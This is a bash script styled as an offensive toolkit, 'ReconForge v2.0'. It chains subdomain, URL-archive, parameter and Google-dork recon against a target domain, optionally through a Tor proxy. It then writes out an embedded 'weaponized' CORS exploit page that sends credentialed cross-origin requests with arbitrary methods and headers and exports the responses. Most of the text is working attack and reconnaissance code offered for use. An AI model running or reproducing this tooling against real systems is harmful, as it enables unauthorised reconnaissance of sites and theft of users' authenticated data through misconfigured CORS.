#!/bin/bash
# 4NDR0666OS — ReconForge v2.0
# Ultimate Orchestrator v2: urlscan + wayback + paramhunter + dorkforge + otx + CORS DeathStar
# Full literal fusion + superset enhancements by Ψ-4ndr0666 under !4NDR0666OS + !P directive
# Superset protocol: all v1.0 functionality preserved and extended

set -o pipefail

RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
CYAN='\033[96m'
RESET='\033[0m'

echo -e "${RED}"
cat << "EOF"
 ______            _____________                              
___  /______________  /___  __/___  _________________________
__  /_  __ \_  ___/  __/_  /_ _  / / /__  /__  /_  _ \_  ___/
_  / / /_/ /(__  )/ /_ _  __/ / /_/ /__  /__  /_/  __/  /    
_/  \____//____/ \__/ /_/    \__,_/ _____/____/\___//_/ 
      
         4NDR0666OS — RECONFORGE v2.0  |  FULL ORCHESTRA
                  All tools chained under raw will
EOF
echo -e "${RESET}"

usage() {
    echo -e "${YELLOW}Usage: $0 <domain> [options]${RESET}"
    echo -e "  -t threads     Concurrency for tools that support it (default 15)"
    echo -e "  -p proxy       SOCKS5/HTTP proxy (e.g. socks5://127.0.0.1:9050)"
    echo -e "  -o dir         Output directory (default: reconforge_<domain>_<timestamp>)"
    echo -e "  -dork \"query\"  Optional Google dork to run (quotes required)"
    echo -e "  -n             Dry-run mode (show commands only)"
    exit 1
}

DOMAIN=""
THREADS=15
PROXY=""
OUTPUT_DIR=""
DORK_QUERY=""
DRY_RUN=false

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t) THREADS="$2"; shift ;;
        -p) PROXY="$2"; shift ;;
        -o) OUTPUT_DIR="$2"; shift ;;
        -dork) DORK_QUERY="$2"; shift ;;
        -n) DRY_RUN=true ;;
        *) 
            if [ -z "$DOMAIN" ]; then
                DOMAIN="$1"
            else
                echo -e "${RED}[!] Unknown argument: $1${RESET}"
                usage
            fi
            ;;
    esac
    shift
done

if [ -z "$DOMAIN" ]; then
    usage
fi

if [ -z "$OUTPUT_DIR" ]; then
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    OUTPUT_DIR="reconforge_${DOMAIN}_${TIMESTAMP}"
fi

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR" || exit 1

PROXY_ARG=""
if [ -n "$PROXY" ]; then
    PROXY_ARG="-p $PROXY"
    echo -e "${CYAN}[+] Global proxy: $PROXY${RESET}"
fi

if [ "$DRY_RUN" = true ]; then
    echo -e "${YELLOW}[DRY-RUN] Commands that would be executed:${RESET}"
fi

echo -e "${GREEN}[*] 4NDR0666OS ReconForge v2.0 starting full orchestra against → $DOMAIN${RESET}"
echo -e "${GREEN}[*] Output directory: $(pwd)${RESET}\n"

# Tool 1: urlscan.io Multithreaded Grinder (subdomains + urls)
echo -e "${YELLOW}[1/6] Launching urlscan.io grinder...${RESET}"
if [ "$DRY_RUN" = true ]; then
    echo "python3 ../urlscan_grinder.py -m subdomains -d \"$DOMAIN\" -t \"$THREADS\" --output \"urlscan\" $PROXY_ARG"
    echo "python3 ../urlscan_grinder.py -m urls -d \"$DOMAIN\" -t \"$THREADS\" --output \"urlscan\" $PROXY_ARG"
else
    ../urlscan_grinder.py -m subdomains -d "$DOMAIN" -t "$THREADS" --output "urlscan" $PROXY_ARG || true
    ../urlscan_grinder.py -m urls -d "$DOMAIN" -t "$THREADS" --output "urlscan" $PROXY_ARG || true
fi

# Tool 2: Wayback CDX Grinder
echo -e "${YELLOW}[2/6] Launching Wayback CDX grinder...${RESET}"
if [ "$DRY_RUN" = true ]; then
    echo "../wayback_grinder.sh \"$DOMAIN\" -s -e -o \"wayback\" $PROXY_ARG"
else
    ../wayback_grinder.sh "$DOMAIN" -s -e -o "wayback" $PROXY_ARG || true
fi

# Tool 3: OTX URL Grinder
echo -e "${YELLOW}[3/6] Launching AlienVault OTX grinder...${RESET}"
if [ "$DRY_RUN" = true ]; then
    echo "../otx_grinder.sh \"$DOMAIN\" -o \"otx\" $PROXY_ARG"
else
    ../otx_grinder.sh "$DOMAIN" -o "otx" $PROXY_ARG || true
fi

# Tool 4: ParamHunter
echo -e "${YELLOW}[4/6] Launching ParamHunter chain...${RESET}"
if [ "$DRY_RUN" = true ]; then
    echo "../paramhunter.sh -d \"$DOMAIN\" -t \"$THREADS\" $PROXY_ARG -o \"paramhunter\""
else
    ../paramhunter.sh -d "$DOMAIN" -t "$THREADS" $PROXY_ARG -o "paramhunter" || true
fi

# Tool 5: DorkForge
if [ -n "$DORK_QUERY" ]; then
    echo -e "${YELLOW}[5/6] Launching DorkForge with query: $DORK_QUERY${RESET}"
    if [ "$DRY_RUN" = true ]; then
        echo "python3 ../dorkforge.py <<< \"$DORK_QUERY\nall\ny\ndorkforge_$DOMAIN\n$PROXY\""
    else
        python3 ../dorkforge.py <<< "
$DORK_QUERY
all
y
dorkforge_$DOMAIN
$PROXY
" || true
    fi
else
    echo -e "${YELLOW}[5/6] Skipping DorkForge (no -dork query provided)${RESET}"
fi

# Tool 6: CORS DeathStar v5.0 (full literal embed)
echo -e "${YELLOW}[6/6] Deploying CORS DeathStar v5.0 PoC...${RESET}"
if [ "$DRY_RUN" = true ]; then
    echo "Creating CORS_DeathStar_v5.0.html"
else
cat > "CORS_DeathStar_v5.0.html" << 'DEATHSTAR_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS DeathStar v5.0 — 4NDR0666OS</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Inter',system-ui,sans-serif; background:linear-gradient(135deg,#0a0c12 0%,#1a1f2e 100%); color:#eaeaea; min-height:100vh; padding:20px; }
        .container { max-width:1100px; margin:0 auto; background:rgba(22,26,32,0.98); backdrop-filter:blur(12px); border-radius:20px; box-shadow:0 25px 60px rgba(0,0,0,0.6),0 0 0 1px rgba(0,255,204,0.08); overflow:hidden; border:1px solid rgba(255,255,255,0.06); }
        .header { padding:35px 50px; background:linear-gradient(90deg,rgba(0,255,204,0.12) 0%,transparent 100%); border-bottom:1px solid rgba(255,255,255,0.06); }
        h1 { font-size:32px; font-weight:700; color:#00ffcc; letter-spacing:-1px; }
        .subtitle { color:#777; font-size:14px; margin-top:6px; }
        .content { padding:40px 50px; }
        .input-group { margin-bottom:28px; }
        label { display:block; margin-bottom:8px; font-size:13px; color:#999; text-transform:uppercase; letter-spacing:0.8px; }
        input, textarea, select { width:100%; padding:14px 18px; background:rgba(11,14,19,0.9); border:2px solid rgba(255,255,255,0.06); border-radius:12px; color:#eaeaea; font-size:15px; }
        input:focus, textarea:focus, select:focus { border-color:#00ffcc; box-shadow:0 0 0 4px rgba(0,255,204,0.1); outline:none; }
        .controls { display:flex; flex-wrap:wrap; gap:16px; margin:30px 0; align-items:center; }
        .btn { padding:14px 28px; font-weight:600; background:linear-gradient(135deg,#00ffcc,#00d4aa); color:#0f1115; border:none; border-radius:12px; cursor:pointer; transition:all .3s; display:flex; align-items:center; gap:8px; }
        .btn:hover { transform:translateY(-3px); box-shadow:0 8px 25px rgba(0,255,204,0.3); }
        .output { margin-top:30px; background:rgba(11,14,19,0.9); border:2px solid rgba(255,255,255,0.06); border-radius:14px; padding:24px; min-height:380px; font-family:'Consolas',monospace; white-space:pre-wrap; word-break:break-all; overflow:auto; }
        .status { padding:6px 14px; border-radius:9999px; font-size:13px; font-weight:600; }
        .success { background:#4ade80; color:#0f1115; }
        .error { background:#f87171; color:#fff; }
        .loading { background:#fbbf24; color:#0f1115; animation:pulse 1.5s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.6} }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>CORS DeathStar v5.0</h1>
        <div class="subtitle">4NDR0666OS — Full weaponized CORS PoC</div>
    </div>
    <div class="content">
        <div class="input-group"><label>Target URL</label><input type="text" id="targetUrl" placeholder="https://target.com/api/v1/users" value="https://"></div>
        <div class="input-group"><label>Method</label><select id="method"><option value="GET">GET</option><option value="POST">POST</option><option value="PUT">PUT</option><option value="DELETE">DELETE</option><option value="OPTIONS">OPTIONS</option></select></div>
        <div class="input-group"><label>Custom Headers (one per line)</label><textarea id="headers" rows="4" placeholder="Authorization: Bearer token"></textarea></div>
        <div class="input-group"><label>Body (JSON/raw)</label><textarea id="body" rows="5" placeholder='{"key":"value"}'></textarea></div>
        <div class="controls">
            <button class="btn" onclick="fireCORS()">🚀 FIRE DEATHSTAR</button>
            <button class="btn" onclick="clearHistory()" style="background:#333;color:#ccc;">Clear History</button>
            <button class="btn" onclick="exportAll()" style="background:#444;color:#fff;">Export All</button>
        </div>
        <div class="output" id="output">Waiting for launch...</div>
        <div class="history"><h3 style="margin:20px 0 12px;color:#777;">Request History</h3><div id="historyList"></div></div>
    </div>
</div>
<script>
let historyLog=[];
function addToHistory(u,m,s,r){const e={timestamp:new Date().toLocaleTimeString(),url:u,method:m,status:s,response:r.substring(0,500)+(r.length>500?'...':'')};historyLog.unshift(e);if(historyLog.length>15)historyLog.pop();renderHistory()}
function renderHistory(){const c=document.getElementById('historyList');c.innerHTML=historyLog.map((h,i)=>`<div class="history-item" onclick="loadHistory(${i})"><strong>${h.method}</strong> ${h.url} <span class="status ${h.status.includes('200')||h.status.includes('success')?'success':'error'}">${h.status}</span><br><small>${h.timestamp}</small><br><small style="color:#666">${h.response}</small></div>`).join('')}
function loadHistory(i){document.getElementById('output').textContent=historyLog[i].response||'No full response'}
function fireCORS(){const u=document.getElementById('targetUrl').value.trim();if(!u)return alert('Enter URL');const m=document.getElementById('method').value;const ht=document.getElementById('headers').value.trim();const b=document.getElementById('body').value.trim();const x=new XMLHttpRequest();x.withCredentials=true;const o=document.getElementById('output');o.textContent='Launching...';x.onload=function(){let s=`HTTP ${x.status} ${x.statusText}`;o.innerHTML=`<strong style="color:#4ade80">${s}</strong>\n\n${x.responseText||'(empty)'}`;addToHistory(u,m,s,x.responseText||'')};x.onerror=function(){o.innerHTML=`<span style="color:#f87171">CORS blocked or not exploitable from this origin.</span>`;addToHistory(u,m,'BLOCKED','CORS error')};x.open(m,u,true);ht.split('\n').forEach(l=>{if(l.includes(':')){const[k,...v]=l.split(':');x.setRequestHeader(k.trim(),v.join(':').trim())}});try{x.send(b?b:null)}catch(e){o.textContent='Error: '+e.message}}
function clearHistory(){historyLog=[];renderHistory()}
function exportAll(){if(!historyLog.length)return alert('No history');const d=JSON.stringify(historyLog,null,2);const b=new Blob([d],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=`cors_deathstar_${new Date().toISOString().slice(0,19)}.json`;a.click()}
</script>
</body>
</html>
DEATHSTAR_EOF
fi

echo -e "\n${GREEN}[✔] 4NDR0666OS ReconForge v2.0 complete!${RESET}"
echo -e "    All v1.0 functionality preserved and extended."
echo -e "    Final output directory: $(pwd)"
echo -e "    CORS DeathStar PoC ready at: CORS_DeathStar_v5.0.html"
echo -e "${CYAN}    Dry-run mode was ${DRY_RUN:+enabled}${DRY_RUN:-disabled}.${RESET}"

cd - > /dev/null
